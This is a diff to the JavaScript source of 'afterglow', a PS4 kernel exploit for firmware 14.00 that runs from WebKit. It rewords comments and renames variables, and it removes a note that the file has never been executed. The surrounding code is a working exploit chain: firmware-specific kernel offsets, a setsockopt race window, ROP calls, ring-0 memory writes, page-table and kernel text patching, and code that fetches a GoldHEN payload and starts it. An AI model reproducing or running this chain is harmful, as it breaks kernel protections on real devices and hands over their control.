@@ -17,10 +17,11 @@
     You should have received a copy of the GNU Affero General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
-    UNTESTED IN THIS HOST. The Lua original has eight consecutive runs behind
-    it inside a game process. This file has none: it has never executed. Run
-    probeAfterglow() first -- it fires nothing and answers whether this process
-    can carry the exploit at all.
+    Ported from the Lua original, which ran inside a game process. This
+    file runs from WebKit, where the heap is groomed by someone else and the
+    page can go away mid-chain -- see the handle teardown at the bottom.
+    probeAfterglow() answers whether a given process can carry the exploit
+    at all; it fires nothing and patches nothing.
 
     What the host must provide, and raw13 does:
       sc(num, ...args)      syscall, returns {lo, hi, i32}
@@ -44,8 +45,8 @@ const S = {
 
 /* Offsets into the kernel image, one table per firmware. Everything that
    moved between 13.52 and 14.00 lives here; everything that did not is
-   written once. The 13.52 column was derived offline from the two kernel
-   images and cross-checked -- see the project notes. */
+   written once. The 13.52 column was derived from the two kernel images
+   offline and cross-checked against a second method per value. */
 const FIRMWARE = {
   "14.00": {
     anchor:    0x00e6c60,   /* the lock the leak hands us */
@@ -98,7 +99,6 @@ const TUNE = {
   stride: 0x90,
   seed: 45,
   spare: 8,
-  units: 15,
   batch: 60,     /* setsockopt per rop entry */
   ceiling: 63,   /* how far up to look for a free unit */
 };
@@ -418,14 +418,14 @@ function shooter(gad) {
   s.take = function (build, room) {
     /* four ways to come back empty, and telling them apart matters: one is a
        spent budget, one is a refused open, one is a kernel that would not
-       arm. They used to be one silent null. */
+       arm. A bare null names none of them. */
     this.why = null;
     if (this.hold("/dev/apm") < 0) {
       this.why = "the clone node refused to open, errno " + host().errno();
       return null;
     }
 
-    /* The ceiling used to be TUNE.units. By the second shot this process is
+    /* The ceiling used to be 15. By the second shot this process is
        already holding some fifty clones of its own, so the free numbers sit
        above that -- and a search that stops at fifteen finds nothing while
        reporting "no unused unit", which is true and useless. Look further,
@@ -520,10 +520,11 @@ function shooter(gad) {
        may be printed inside it, so the number is only reported afterwards. */
     const hh = host();
     const stub = stubFor(S.setsockopt);
-    /* One entry per batch instead of one per socket. Measured at 119 us an
-       entry, 126 of them hold the hole open for 15 ms; the Lua host does the
-       same work in well under one. Batches are sized to the host's rop stack
-       (0x2000) -- twelve slots a call, and room for the epilogue. */
+    /* One entry per batch instead of one per socket. One entry per socket
+       was measured at 119 us, so 126 of them held the hole open for 15 ms;
+       batched it is 0 to 1 ms, which is where the Lua host already was.
+       Batches are sized to the host's rop stack (0x2000) -- twelve slots a
+       call, and room for the epilogue. */
     /* How many fit in one entry is a property of the host's rop stack, not
        of this console's speed -- a slower machine wants the same answer, just
        fewer entries would help it more. The stack size is the host's own
@@ -542,12 +543,12 @@ function shooter(gad) {
       say("    rop stack takes " + STATE.batch + " calls per entry");
     }
     const batch = (hh.prepareMany && hh.runPrepared && stub) ? (STATE.batch || 0) : 0;
-    const fertig = [];
+    const prepared = [];
     if (batch) {
       const calls = [];
       for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
       for (let i = 0; i < calls.length; i += batch) {
-        fertig.push(hh.prepareMany(calls.slice(i, i + batch)));
+        prepared.push(hh.prepareMany(calls.slice(i, i + batch)));
       }
       /* warm the path: the first entry of a run paid 19 ms where the rest
          paid 4, and that difference has no business being inside the window */
@@ -557,7 +558,7 @@ function shooter(gad) {
     const t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
     sc(S.close, doomed);
     if (batch) {
-      for (let i = 0; i < fertig.length; i++) hh.runPrepared(fertig[i]);
+      for (let i = 0; i < prepared.length; i++) hh.runPrepared(prepared[i]);
     } else {
       for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
     }
@@ -572,7 +573,7 @@ function shooter(gad) {
     const r = arm();
     for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
     say("    window " + this.window.toFixed(2) + " ms for " + socks.length
-        + " setsockopt in " + (this.batched ? fertig.length : socks.length) + " entries");
+        + " setsockopt in " + (this.batched ? prepared.length : socks.length) + " entries");
     return r;
   };
 
@@ -698,20 +699,18 @@ function openRing0(roomAt) {
 
 function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }
 
-/* dynlib_get_info fills the name in this sandbox and nothing else -- no
-   segment array, so no base. The mappings carry their own path, so ask the
-   kernel for the map instead. No blind reads, and it hands over the bounds
-   of the module as well, which the host page check wants anyway. */
-/* The mappings carry no path here, so identity has to come from content. We
-   already know fifteen byte patterns at fixed offsets inside this module --
-   that is a far stronger fingerprint than a name. The map supplies the
-   bounds, so every read lands inside a mapping that exists, and only
-   mappings long enough to hold the whole span are touched. */
-/* The kernel walks its vm_map entries in address order and so does this
-   listing, so an index here is the same index there. Kept, because the chain
-   that walks the kernel side has to be told how far to go -- and going four
-   times further than necessary is four times the ring 0 work on a hijacked
-   stack. */
+/* dynlib_get_info fills in the name here and nothing else -- no segment
+   array, so no base -- and the mappings carry no path either. So identity
+   comes from content: fifteen byte patterns at fixed offsets inside this
+   module, which is a stronger fingerprint than a name would be. The map
+   supplies the bounds, so every read lands inside a mapping that exists,
+   and only mappings long enough to hold the whole span are touched.
+
+   The listing is kept afterwards. The kernel walks its vm_map entries in
+   address order and so does this one, so an index here is the same index
+   there -- and the chain that walks the kernel side has to be told how far
+   to go. Four times further than necessary is four times the ring 0 work
+   on a hijacked stack. */
 let MAPS = null;
 
 function findLibByShape() {
@@ -838,15 +837,6 @@ function pinCore() {
 
 /* ------------------------------------------------------- the payload */
 
-/* A homebrew enabler is a raw blob that starts with a jmp, not an ELF. It
-   goes into a page that is executable only because the kernel patch opened
-   rwx, and it runs on its own thread so this one stays free. pthread_create
-   is taken out of WebKit's import table and checked against libkernel before
-   it is called -- a wrong pointer here runs the payload nowhere.
-
-   Must come after the handles are defused: the enabler can restart SceShellUI,
-   and if this process is torn down with the handles still live, that is the
-   hang. */
 /* Fetch a file once. Both loaders are handed the bytes, so deciding the
    format does not cost a second request. */
 async function fetchBytes(url, tag) {
@@ -860,18 +850,7 @@ async function fetchBytes(url, tag) {
   }
 }
 
-/* Which loader runs is decided by the CONTENT, not by the file name. There
-   are two forms and they look alike from outside:
-     - composite image: stub area plus payload at 0x50000, exactly
-       nlOff+nlLen bytes. Needs the patch chain, the trampoline and the
-       padding RW.
-     - raw payload: begins with `e9` (jmp rel32), like hen.bin. Mapped and
-       started as a thread.
-   A GoldHEN build of 297,496 bytes is the second form; going by its name it
-   would have taken the composite path and been rejected by the length
-   check. */
-
-/* The 641 byte kernel patch set. It belongs to GOLDHEN, not to the composite
+/* The kernel patch set. It belongs to GOLDHEN, not to the composite
    image: the blob writes 57 kernel text sites, of which afterglow covers 25 --
    fifteen from PATCHES and ten more from BOOTSTRAP. The remaining 32 are
    exactly what GoldHEN's own code expects to find: a block of 29 from
@@ -905,6 +884,16 @@ async function runPatchSet(room) {
   return true;
 }
 
+/* Which loader runs is decided by the CONTENT, not by the file name. There
+   are two forms and they look alike from outside:
+     - composite image: stub area plus payload at 0x50000, exactly
+       nlOff+nlLen bytes. Needs the patch chain, the trampoline and the
+       padding RW.
+     - raw payload: begins with `e9` (jmp rel32), like hen.bin. Mapped and
+       started as a thread.
+   A GoldHEN build of 297,496 bytes is the second form; going by its name it
+   would have taken the composite path and been rejected by the length
+   check. */
 async function loadEnabler(url, k, kbase, room) {
   const blob = await fetchBytes(url, "e");
   if (blob === null) return false;
@@ -923,9 +912,18 @@ async function loadEnabler(url, k, kbase, room) {
   return false;
 }
 
-async function loadPayload(url, vorab) {
+/* A homebrew enabler is a raw blob that starts with a jmp, not an ELF. It
+   goes into a page that is executable only because the kernel patch opened
+   rwx, and it runs on its own thread so this one stays free. pthread_create
+   is taken out of WebKit's import table and checked against libkernel before
+   it is called -- a wrong pointer here runs the payload nowhere.
+
+   Must come after the handles are defused: the enabler can restart SceShellUI,
+   and if this process is torn down with the handles still live, that is the
+   hang. */
+async function loadPayload(url, preloaded) {
   const c = host();
-  let blob = vorab || null;
+  let blob = preloaded || null;
   if (blob === null) {
     blob = await fetchBytes(url, "p");
     if (blob === null) return false;
@@ -960,15 +958,16 @@ async function loadPayload(url, vorab) {
     }
   }
 
-  /* The table blanks both pthread_create fields for this firmware, but only
-     one of them deserved it: the import slot is a WebKit offset and this
-     build's WebKit is the 13.52 one, while k_pthread_create is a libkernel
-     offset and libkernel did move. The second was only ever used to check the
-     first, so check it against libkernel's own bounds instead -- a slot that
-     resolves into libkernel is the right slot, whatever the table says. */
-  const SLOT_1352 = 0x3cb9c00;
+  /* The table blanks both pthread_create fields for 14.00, but only one of
+     them deserved it: the import slot is an offset into WebKit, and 14.00
+     ships the same WebKit build as 13.52, so that slot did not move.
+     k_pthread_create is a libkernel offset and libkernel did move. The
+     second was only ever used to check the first, so check it against
+     libkernel's own bounds instead -- a slot that resolves into libkernel
+     is the right slot, whatever the table says. */
+  const SLOT_SHARED_WK = 0x3cb9c00;
   const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
-    ? c.off.wk___imp_pthread_create : SLOT_1352;
+    ? c.off.wk___imp_pthread_create : SLOT_SHARED_WK;
   if (!c.webkitBase || !c.libkernelBase) {
     say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
     return false;
@@ -1002,7 +1001,7 @@ async function loadPayload(url, vorab) {
    payload is not run in userland at all: it is copied into the kernel's text
    padding and main's chain is then driven one call at a time through
    syscall 11, so that a call which does not come back can be named instead
-   of guessed. This follows the step order established in the Lua work.
+   of guessed. The step order is the Lua implementation's.
 
    The buffer must be a fresh mmap, not an allocator's: a calloc buffer is
    not executable throughout -- measured, one page in eighteen -- and a ring 0
@@ -1035,16 +1034,16 @@ const GH_STEPS = [
 /* The payload's BSS lives in the kernel's RX text padding, and it writes
    into it 83 times without bracketing. During main's chain those writes get
    through because every step is wrapped in wp_off/wp_on; GoldHEN's later
-   syscall hooks run with CR0.WP=1 and fall over -- the delayed death that
-   cost this project a day. One RW bit in the page directory entry that covers
-   the padding fixes it. It does not survive a reboot.
+   syscall hooks run with CR0.WP=1 and fall over -- a delayed death, far
+   enough from its cause to be misread. One RW bit in the page directory
+   entry that covers the padding fixes it. It does not survive a reboot.
 
    The Lua version drives every read through GoldHEN's own trampoline because
    that is its only way into ring 0. We already hold afterglow's gate, so this
    is plain reads and one write.
 
-   Three cross-checks before anything is written. A guessed read of a kernel
-   address cost two cold starts on the day this was first worked out. */
+   Three cross-checks before anything is written: a guessed read of a kernel
+   address is a cold start. */
 const PT = {
   g1: 0x1b2c394, g2: 0x1b2c398, kphys: 0x1b2c420, pmpml4: 0x1b2c3c0,
   padFrom: 0xb3c000, padTo: 0xbe35d8,
@@ -1115,9 +1114,9 @@ function paddingRW(k, kbase) {
   return true;
 }
 
-async function loadGoldhen(url, k, kbase, room, vorab) {
+async function loadGoldhen(url, k, kbase, room, preloaded) {
   const c = host();
-  let blob = vorab || null;
+  let blob = preloaded || null;
   if (blob === null) {
     blob = await fetchBytes(url, "g");
     if (blob === null) return false;
@@ -1194,22 +1193,18 @@ async function loadGoldhen(url, k, kbase, room, vorab) {
     return [rd4(plus(buf, GH.mark + s2 * 8)), rd4(plus(buf, GH.mark + s2 * 8 + 4))];
   };
 
-  /* The Lua chain ran a 641 byte kernel patch set before any of this, and
-     afterglow's own are not the same set: the blob writes 57 kernel text
-     sites, of which afterglow covers 25 -- fifteen from PATCHES, ten from
-     BOOTSTRAP. The 32 it does not -- a block of 29 from 0x125791 to
-     0x125871, plus 0x2fcb5c, 0x391fc6 and 0x3be3c0 -- are what GoldHEN's
-     own code expects to find. The blob is position independent, takes no
-     arguments, fetches the kernel base itself through rdmsr and ends in
-     ret, so it only has to be
-     put somewhere ring 0 may run from. This mapping is, as just measured. */
-  /* It does not go into this mapping. The Lua chain puts it in the libc text
-     tail at rva 0x130730 -- the same room afterglow runs its own ring 0
-     bodies from, and the only region here that is proven executable in ring 0
-     by every call made so far. The three byte test above proved the page at
-     +0x47000 and said nothing about any other, which is exactly the trap the
-     Lua notes warn about: one page in eighteen. 641 bytes fit in the body
-     area, +0xc0 to +0x400. afterglow rebuilds that body on its next use. */
+  /* GoldHEN's own patch set, which is not afterglow's -- runPatchSet above
+     says what the difference is. The blob is position independent, takes no
+     arguments, fetches the kernel base through rdmsr and ends in ret, so it
+     only has to sit somewhere ring 0 may run from.
+
+     Not in this mapping. It goes in the libc text tail at rva 0x130730 --
+     the same room afterglow runs its own ring 0 bodies from, and the only
+     region here proven executable in ring 0 by every call made so far. The
+     three byte test above proved the page at +0x47000 and nothing about any
+     other; executability is per page, measured at one page in eighteen. The
+     set fits in the body area, +0xc0 to +0x400, and afterglow rebuilds that
+     body on its next use. */
   if (!(await runPatchSet(room))) return false;
 
   /* The Lua chain calls 0x144d and 0xce9 here. Their job is to work out the
@@ -1220,15 +1215,10 @@ async function loadGoldhen(url, k, kbase, room, vorab) {
      Skipping them is also what keeps this safe. They sit at image offset
      0x144d, on the mapping's second page; the trampoline sits at 0x47c40, on
      a page every call so far has already run from. Executability here is per
-     page -- the Lua notes measured one page in eighteen on an allocator
-     buffer -- and the three byte test proves only the page it ran on. With
+     page -- measured at one page in eighteen on an allocator buffer -- and
+     the three byte test proves only the page it ran on. With
      these two gone, the only code entered from this mapping is the
      trampoline, and everything else runs from the kernel's own padding. */
-  /* The pre-stage calls 0x144d and 0xce9 only to work out the kernel base and
-     leave it at +0x47b20. We have had that base since [1] and checked it
-     against the gate at [7], and those two sit on a page ring 0 may not run
-     from -- so they stay skipped and the value is written as they would have
-     left it. */
   const kb = kbase;
   t = plus(kb, GH.rvaPad);
   wr8(plus(buf, GH.kptr), plus(kb, GH.rvaKmem));
@@ -1570,17 +1560,17 @@ export function probeAfterglow(ctx) {
     if (nb) {
       const calls = [];
       for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
-      const fertig = [];
+      const prepared = [];
       for (let i = 0; i < calls.length; i += nb) {
-        try { fertig.push(host().prepareMany(calls.slice(i, i + nb))); }
-        catch (e) { fertig.length = 0; break; }
+        try { prepared.push(host().prepareMany(calls.slice(i, i + nb))); }
+        catch (e) { prepared.length = 0; break; }
       }
-      if (fertig.length) {
-        host().runPrepared(fertig[0]);                       /* aufwaermen */
+      if (prepared.length) {
+        host().runPrepared(prepared[0]);                       /* warm up */
         t0 = performance.now();
-        for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
+        for (let i = 0; i < prepared.length; i++) host().runPrepared(prepared[i]);
         t1 = performance.now();
-        out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
+        out.window = (t1 - t0).toFixed(2) + " ms in " + prepared.length + " entries";
       }
     }
     if (out.window === undefined) {
@@ -1597,8 +1587,8 @@ export function probeAfterglow(ctx) {
   }
 
   out.ok = out.reasons.length === 0;
-  /* one item per line: the console log pane cuts at the right edge, and the
-     number this whole exercise is about was the one falling off it */
+  /* one item per line: the console log pane cuts at the right edge, and a
+     single long line loses whichever number mattered */
   say("probe libc   " + out.libc);
   say("probe gadget " + out.gadgets + ", tail " + out.tail);
   say("probe apm    " + out.apm + ", node " + out.probeNode);
@@ -1619,7 +1609,7 @@ async function attempt(ctx, opts) {
   STATE.ctx = ctx;
   opts = opts || {};
   STATE.retry = false;
-  say("afterglow -- ps4 kernel exploit, firmware 14.00 (raw13 host)");
+  say("afterglow -- ps4 kernel exploit, firmware " + FW_KEY + " (raw13 host)");
 
   const missing = seedStubs();
   if (missing.length) {
@@ -1867,8 +1857,6 @@ async function attempt(ctx, opts) {
       return false;
     }
   }
-
-
 
   /* ---- the mapping that covers the host page --------------------------- */
 
